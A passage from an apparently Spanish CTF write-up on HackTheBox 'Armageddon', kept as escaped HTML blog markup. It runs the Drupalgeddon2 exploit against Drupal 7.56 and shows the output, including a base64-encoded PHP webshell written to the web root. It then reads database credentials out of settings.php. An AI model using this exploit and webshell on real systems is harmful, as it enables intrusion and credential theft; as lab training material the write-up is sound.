/index.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/LICENSE.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/misc &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/modules &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/profiles &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/README.txt &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/scripts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/sites &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/themes &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/update.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/web.config &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/xmlrpc.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/xmlrpc.php &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;drupalgeddon&#34;&gt;DRUPALGEDDON&lt;/h2&gt;
&lt;p&gt;Realizamos una busqueda de las versiones mÃ¡s cercanas a &lt;code&gt;Drupal 7.56&lt;/code&gt; la cual tenga un exploit o vulnerabilidad. Encontramos &lt;code&gt;Drupalgeddon2&lt;/code&gt; y &lt;code&gt;Drupalgeddon3&lt;/code&gt; las mÃ¡s sobresalientes.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;âââ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/armageddon&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
ââ$ searchsploit drupal 7.56                                                                                                      &lt;span class=&#34;m&#34;&gt;130&lt;/span&gt; â¨¯
------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  Path
------------------------------------------------------------------------------------------------------ ---------------------------------
Drupal &amp;lt; 7.58 - &lt;span class=&#34;s1&#34;&gt;&amp;#39;Drupalgeddon3&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Authenticated&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Remote Code &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Metasploit&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                              &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/44557.rb
Drupal &amp;lt; 7.58 - &lt;span class=&#34;s1&#34;&gt;&amp;#39;Drupalgeddon3&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Authenticated&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Remote Code Execution &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PoC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                           &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/44542.txt
Drupal &amp;lt; 7.58 / &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - &lt;span class=&#34;s1&#34;&gt;&amp;#39;Drupalgeddon2&amp;#39;&lt;/span&gt; Remote Code Execution                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/44449.rb
Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - &lt;span class=&#34;s1&#34;&gt;&amp;#39;Drupalgeddon2&amp;#39;&lt;/span&gt; Remote Code Execution &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Metasploit&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;               &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/remote/44482.rb
Drupal &amp;lt; 8.3.9 / &amp;lt; 8.4.6 / &amp;lt; 8.5.1 - &lt;span class=&#34;s1&#34;&gt;&amp;#39;Drupalgeddon2&amp;#39;&lt;/span&gt; Remote Code Execution &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PoC&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                      &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/44448.py
Drupal &amp;lt; 8.5.11 / &amp;lt; 8.6.10 - RESTful Web Services unserialize&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; Remote Command Execution &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Metasploit&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/remote/46510.rb
Drupal &amp;lt; 8.6.10 / &amp;lt; 8.5.11 - REST Module Remote Code Execution                                        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/46452.txt
Drupal &amp;lt; 8.6.9 - REST Module Remote Code Execution                                                    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; php/webapps/46459.py
------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;La vulnerabilidad de la cual Drupalgeddon2 se aprovecha se encuentra en la &amp;ldquo;API&amp;rdquo; de &lt;a href=&#34;https://research.checkpoint.com/2018/uncovering-drupalgeddon-2/&#34;&gt;Formularios&lt;/a&gt; de Drupal.&lt;/p&gt;
&lt;h1 id=&#34;apache---user&#34;&gt;APACHE - USER&lt;/h1&gt;
&lt;p&gt;Encontramos un &lt;a href=&#34;https://github.com/dreadlocked/Drupalgeddon2&#34;&gt;exploit&lt;/a&gt; el cual realiza la explotacion para &lt;code&gt;Drupalgeddon2&lt;/code&gt; con la cual logramos ejecutar comandos como usuario &lt;code&gt;Apache&lt;/code&gt; con una simple webshell.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ââ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/armageddon&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
ââ$ ruby drupalgeddon2.rb                      
Usage: ruby drupalggedon2.rb &amp;lt;target&amp;gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;--authentication&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;--verbose&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Example &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; target that does not require authentication:
       ruby drupalgeddon2.rb https://example.com
Example &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; target that does require authentication:
       ruby drupalgeddon2.rb https://example.com --authentication

âââ&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/armageddon&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
ââ$ ruby drupalgeddon2.rb http://10.129.89.116/
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; --&lt;span class=&#34;o&#34;&gt;==[&lt;/span&gt;::#Drupalggedon2::&lt;span class=&#34;o&#34;&gt;]==&lt;/span&gt;--
--------------------------------------------------------------------------------
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Target : http://10.129.89.116/
--------------------------------------------------------------------------------
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found  : http://10.129.89.116/CHANGELOG.txt    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTTP Response: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Drupal!: v7.56
--------------------------------------------------------------------------------
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Testing: Form   &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;user/password&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Result : Form valid
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Testing: Clean URLs
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Result : Clean URLs disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTTP Response: 404&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;i&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Isn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t an issue for Drupal v7.x
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;--------------------------------------------------------------------------------
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Testing: Code Execution   (Method: name)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[i] Payload: echo ECWIGPQW
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Result : ECWIGPQW
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;--------------------------------------------------------------------------------
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Testing: Existing file   (http://10.129.89.116/shell.php)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[i] Response: HTTP 404 // Size: 5
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[*] Testing: Writing To Web Root   (./)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Result : &amp;lt;?php if( isset( $_REQUEST[&amp;#39;&lt;/span&gt;c&lt;span class=&#34;s1&#34;&gt;&amp;#39;] ) ) { system( $_REQUEST[&amp;#39;&lt;/span&gt;c&lt;span class=&#34;s1&#34;&gt;&amp;#39;] . &amp;#39;&lt;/span&gt; 2&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;1&lt;span class=&#34;s1&#34;&gt;&amp;#39; ); }
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;--------------------------------------------------------------------------------
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[i] Fake PHP shell:   curl &amp;#39;&lt;/span&gt;http://10.129.89.116/shell.php&lt;span class=&#34;s1&#34;&gt;&amp;#39; -d &amp;#39;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;hostname&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
armageddon.htb&amp;gt;&amp;gt;
armageddon.htb&amp;gt;&amp;gt; whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
apache
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;48&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;apache&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;48&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;apache&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;48&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;apache&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;system_u:system_r:httpd_t:s0
/var/www/html
armageddon.htb&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;drupal-db&#34;&gt;DRUPAL DB&lt;/h2&gt;
&lt;p&gt;Con esta webshell realizamos una enumeracion de los archivos de configuracion de drupal, donde &lt;a href=&#34;https://drupal.stackexchange.com/a/225489&#34;&gt;encontramos&lt;/a&gt; el archivo de configuracion que contiene las credenciales de la base de datos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;armageddon.htb&amp;gt;&amp;gt; find . -name settings.php 2&amp;gt;/dev/null
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; WARNING: Detected an known bad character &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&amp;gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
./sites/default/settings.php
armageddon.htb&amp;gt;&amp;gt; cat ./sites/default/settings.php&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;grep &lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;
 *   &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;,
 * username, password, host, and database name.
 *   &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;,
 *   &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;,
 *     &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;,
 *     &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;,
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;CQHEy@9M*m23gBVj&amp;#39;&lt;/span&gt;,
 * by using the username and password variables. The proxy_user_agent variable
&lt;span class=&#34;c1&#34;&gt;# $conf[&amp;#39;proxy_password&amp;#39;] = &amp;#39;&amp;#39;;&lt;/span&gt;
armageddon.htb&amp;gt;&amp;gt;

&lt;span class=&#34;nv&#34;&gt;$databases&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; array &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;                                                                           
  &lt;span class=&#34;s1&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt;
  array &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
    &lt;span class=&#34;s1&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt;
    array &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;database&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;drupal&amp;#39;&lt;/span&gt;,
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;drupaluser&amp;#39;&lt;/span&gt;,
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;CQHEy@9M*m23gBVj&amp;#39;&lt;/span&gt;,
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;,
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;port&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;driver&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt;,
      &lt;span class=&#34;s1&#34;&gt;&amp;#39;prefix&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
    &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
  &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;,
&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando estas credenciales con mysql, logrando obtener la contraseÃ±a encriptada de la base de datos de drupal del usuario &lt;code&gt;brucetherealadmin&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
